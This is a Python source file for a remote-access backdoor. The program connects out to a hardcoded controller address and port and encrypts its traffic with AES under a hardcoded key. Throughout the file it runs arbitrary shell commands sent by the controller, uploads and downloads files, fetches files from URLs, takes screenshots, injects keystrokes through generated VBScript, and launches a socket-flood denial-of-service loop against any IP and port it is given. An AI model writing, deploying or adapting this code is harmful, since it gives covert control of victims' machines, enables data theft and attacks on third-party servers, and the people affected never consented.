from Crypto.Cipher import AES
import ImageGrab, subprocess, platform, urllib2, socket, base64, time, sys, os

# the block size for the cipher object; must be 16 per FIPS-197
BLOCK_SIZE = 16

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)) .rstrip(PADDING)

# generate a random secret key
secret = 'gemzpFUL^6Gak^QbqDDJbgf~baMp<*h7'

# create a cipher object using the random secret

# encode a string
# encoded = EncodeAES(cipher, 'password')
# print 'Encrypted string:', encoded

# decode the encoded string
# decoded = DecodeAES(cipher, encoded)
# print 'Decrypted string:', decoded


##################################################
# Initializing

host = '192.168.2.164'
# host = sys.argv[1]
port = 1337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
interval = 0.8


##################################################
# Functions

# send data
def Send(sock, cmd, encryption, end="EOFEOFEOFEOFEOFX"):
    if encryption:
        sock.sendall(EncodeAES(cipher, cmd + end))
    else:
        sock.sendall(cmd + end)


# receive data
def Receive(sock, encryption, end='EOFEOFEOFEOFEOFX'):
    data = ''
    l = sock.recv(1024)
    while (l):
        if encryption:
            decrypted = DecodeAES(cipher, l)
        else:
            decrypted = l
        data += decrypted
        if data.endswith(end):
            break
        else:
            l = sock.recv(1024)
    return data[: -len(end)]


# upload file to server
def Upload(sock, filename, encryption):
    # transfer data
    try:
        # open file
        f = open(filename, 'rb')
        while True:
            # read a part of the file
            data = f.readline(1024)
            if data == '':
                # send the end
                Send(sock, '', encryption)
                break
            else:
                # send file data
                Send(sock, data, encryption, '')
    except:
        time.sleep(0.1)
    time.sleep(interval)
    # send output data
    Send(sock, 'Finished download.\n', encryption)


# download file from server
def Download(sock, filename, encryption):
    # open file
    f = open(filename, 'wb')
    # download file
    fileData = Receive(sock, encryption)
    time.sleep(interval)
    f.write(fileData)
    f.close()
    Send(s, 'Finished upload.', encryption)


# download file from url
def downHTTP(sock, url, encryption, local_filename=None):
    # extract filename from url
    filename = url.split('/')[-1].split('#')[0].split('?')[0]
    if not local_filename:
        local_filename = filename
    # open file
    Send(sock, 'Downloading: ' + filename + ' > ' + local_filename, encryption)
    f = open(local_filename, 'wb')
    u = urllib2.urlopen(url)
    fileData = u.read()
    Send(s, 'File size: ' + str(round(len(fileData) / 1000000, 2)) + 'MB = ' + str(len(fileData)) + 'B' + '\n', encryption)
    f.write(fileData)
    f.close()


# take a screenshot
def Screenshot():
    img = ImageGrab.grab()
    saveas = os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S') + '.png')
    img.save(saveas)
    imgout = 'Screenshot saved as: ' + str(saveas) + '\n'
    return imgout


# dos a server
def Dos(ip, port):
    while True:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            connection.connect((ip, port))
            connection.send("GET " + "Martin Router King: I have a stream" + "HTTP/1.1 \r\n")
            connection.sendto("GET " + "Martin Router King: I have a stream" + "HTTP/1.1 \r\n", (ip, port))
        except socket.error:
            pass
        connection.close()



def sendKeys(keys):
    f = open('sendKeys.vbs', 'wb')
    f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\n')
    f.write('WshShell.SendKeys "' + keys + '"')
    f.close()
    os.system('sendKeys.vbs')
    os.remove('sendKeys.vbs')


def activateApp(program):
    f = open('activateApp.vbs', 'wb')
    f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\n')
    f.write('WshShell.AppActivate "' + program + '"')
    f.close()
    os.system('activateApp.vbs')
    os.remove('activateApp.vbs')

##################################################
# Main Program

# generate cipher key from secret
cipher = AES.new(secret)
# main loop
while True:
    time.sleep(1)
    # connect to server
    s.connect((host, port))
    # encryption is enabled
    encryption = True
    # receive activate data
    data = Receive(s, encryption)
    if data.startswith('cmd '):
        proc = subprocess.Popen(data[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        # send output
        Send(s, stdoutput, encryption)
    elif data == 'Activate':
        # sleep
        time.sleep(interval)
        # send welcome data
        sendData = ' -- OS : ' + platform.system() + ' ' + platform.release() + '  --  Build : ' + platform.version()+ ' --\n'
        Send(s, sendData, encryption)
        # backdoor is active
        active = True
        while active:
            # receive command from server
            data = Receive(s, encryption)
            # quit
            if data == 'quit' or data == 'exit':
                Send(s, 'quitted', encryption)
                active = False
            # send directory information
            elif data == 'get current dir':
                currentDir = str(os.getcwd())
                Send(s, currentDir, encryption)
            # change directory
            elif data.startswith('cd '):
                cmd = data.split(' ')[1]
                try:
                    os.chdir(cmd)
                    Send(s, '', encryption)
                except:
                    Send(s, "Directory '" + cmd + "' doesn't extist", encryption)
            # encryption setting
            elif data.startswith('encryption '):
                if data.split(' ')[1] == 'on':
                    encryption = True
                elif data.split(' ')[1] == 'off':
                    encryption = False
            # download (send file to server)
            elif data.startswith('download '):
                Upload(s, data.split(' ')[1], encryption)
            # download file from webserver
            elif data.startswith('downHTTP '):
                if len(data.split(' ')) == 2:
                    downHTTP(s, data.split(' ')[1], encryption)
                else:
                    downHTTP(s, data.split(' ')[1], encryption, data.split(' ')[2])
            # upload (receive file from server)
            elif data.startswith('upload '):
                Download(s, data.split()[1], encryption)
            # take screenshot
            elif data.startswith('screenshot'):
                Send(s, Screenshot(), encryption)
            # execute keystrokes
            elif data.startswith('sendKeys ') or data.startswith('sendkeys '):
                sendKeys(data.split(' ')[1])
                Send(s, 'Executed Keys.\n', encryption)
            # bring running program in the foreground
            elif data.startswith('activateApp ') or data.startswith('activateapp '):
                activateApp(data.split(' ')[1])
                Send(s, 'Activated ' + data.split(' ')[1] + '.\n', encryption)
            # dos a server
            elif data.startswith('dos '):
                if len(data.split(' ')) == 3:
                    Send(s, 'Starting DOS against ' + data.split(' ')[1] + ':' + data.split(' ')[2], encryption)
                    Dos(data.split(' ')[1], int(data.split(' ')[2]))
                else:
                    Send(s, 'Syntax: dos [ip] [port]', encryption)
            # normal command
            elif data != '':
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdoutput = proc.stdout.read() + proc.stderr.read()
                # send output
                Send(s, stdoutput, encryption)
        time.sleep(3)
        s.close()
# close connection
s.close()